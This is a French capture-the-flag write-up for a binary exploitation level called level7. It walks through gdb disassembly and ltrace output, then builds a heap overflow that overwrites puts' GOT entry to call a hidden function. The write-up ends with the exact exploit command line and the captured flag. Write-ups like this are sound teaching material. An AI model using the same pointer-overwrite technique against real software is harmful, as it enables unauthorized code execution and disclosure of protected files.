Comme pour le level6, nous sommes en presence d'un binaire level7 mais qui segfault si le nombre d'argument est inferieur a 2.

./level7 AAAA BBBB
~~

En etudiant les infos du programme nous remarquons la presence des fonctions main et m et pour les variables la presence d'une variable c a l'adresse 0x08044960
Desassemblons les fonctions main et m grace a gdb :
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:		push   %ebp
   0x08048522 <+1>:		mov    %esp,%ebp
   0x08048524 <+3>:		and    $0xfffffff0,%esp
   0x08048527 <+6>:		sub    $0x20,%esp
   0x0804852a <+9>:		movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax   
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret
End of assembler dump.
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:		push   %ebp
   0x080484f5 <+1>:		mov    %esp,%ebp
   0x080484f7 <+3>:		sub    $0x18,%esp
   0x080484fa <+6>:		movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret
End of assembler dump.

En essayant de chercher un overflow sur le deuxieme argument nous n'arrivons pas a faire segfault le programme. Essayons donc de faire segfault le programme sur le premier argumentgrace a https://wiremask.eu/tools/buffer-overflow-pattern-generator/
Le programme segfault bien mais l'adresse ne correspond a aucun offset de la chaine envoyée
Grace a gdb et a plusieurs essais avec des breakpoints nous remarquons que la fonction crash juste apres l'appel a strcpy (main+156) et ce a partir de 20 caracteres.

Lancons un ltrace pour voir ce au'il se passe lorsque nous ne faisons pas segfault le programme : 
ltrace ./level7 AAAA BBBB
__libc_start_main(0x8048521, 3, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                    = 0x0804a008
malloc(8)                                                                    = 0x0804a018
malloc(8)                                                                    = 0x0804a028
malloc(8)                                                                    = 0x0804a038
strcpy(0x0804a018, "AAAA")                                                   = 0x0804a018
strcpy(0x0804a038, "BBBB")                                                   = 0x0804a038
fopen("/home/user/level8/.pass", "r")                                        = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

Nous voyons l'appel a la fonction fopen qui va essayer d'ouvrir le fichier /home/user/level8/.pass en lecture seule. Ayant les droits du level8, cet appel a fopen devrait fonctionner. Tout de suite apres fopen nous voyons un appel a fgets. fgets prend en argument dans l'ordre la variable c qui sera le buffer dans lequel sera copié 0x44-1 caracteres du stream retour de la fonction fopen. Enfin nous avons un appel a la fonction puts qui prend "~~" en argument pour nous le renvoyer.

Essayons de faire overflow notre premier argument. Sachant que le programme va segfault a partir de 20 caracteres entrant la commande suivante :
ltrace ./level7 `python -c 'print "A"*24'` BBBB
__libc_start_main(0x8048521, 3, 0xbffff7a4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                         = 0x0804a008
malloc(8)                                         = 0x0804a018
malloc(8)                                         = 0x0804a028
malloc(8)                                         = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAA")    = 0x0804a018
strcpy(0x41414141, "aaa" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

Qu'observons nous ? Que l'adresse du premier argument du deuxieme strcpy a te ecrasé par 0x41414141 d'ou le segfault car cette adresse n'existe pas. Il y a eu ici une tentative d'ecrire dans l'adresse 0x41414141 BBBB.
Interessons nous de plus pres a la fonction m cette fois qui n'a pas ete appelée. Le printf present dans cette fonction sera parametre de cette facon : 
printf("%s - %d", c , time()); Le c represente donc le buffer contenant le flag recupere au prealable dans la main.
Comment acceder a cette fonction m ? 
En utilisant strcpy nous avons essayé d'ecrire a l'adresse 0x41414141 pour y mettre BBBB
Essayons alors de prendre l'adresse du jmp present dans la fonction puts afin de la remplacer par l'adresse du debut de la fonction m :

./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\08"'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1615986106

Nous obtenons bien le flag suivi du retour de la fonction time.



